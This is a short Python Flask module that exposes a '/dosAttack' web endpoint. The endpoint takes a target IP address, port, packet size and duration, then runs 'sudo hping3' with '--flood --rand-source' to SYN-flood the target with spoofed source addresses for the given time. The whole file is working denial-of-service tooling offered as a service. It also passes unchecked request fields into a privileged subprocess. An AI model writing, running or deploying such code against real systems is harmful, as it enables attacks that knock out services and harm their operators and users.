from flask import Blueprint, request
import signal
import subprocess
import time

dosAttack = Blueprint("dosAttack", __name__, url_prefix="/dosAttack")

@dosAttack.post("/")
def SYNFloodAttack():
    data = request.get_json()
    ipAddress = data["ipAddress"]
    portNumber = data["portNumber"]
    packetSize = data["packetSize"]
    type = data["type"]
    duration = int(data["duration"])

    dosCommand = subprocess.Popen(['sudo', 'hping3', type, '-d', packetSize, '--flood', '--rand-source', '-p', portNumber, ipAddress])
    time.sleep(duration) # carry out attack for specified duration

    try:
        dosCommand.send_signal(signal.SIGINT) # Send CTRL+c to kill the child process
    except subprocess.TimeoutExpired:
        print('Timeout occured')
    
    dosCommand.kill()

    return "DoS Complete"


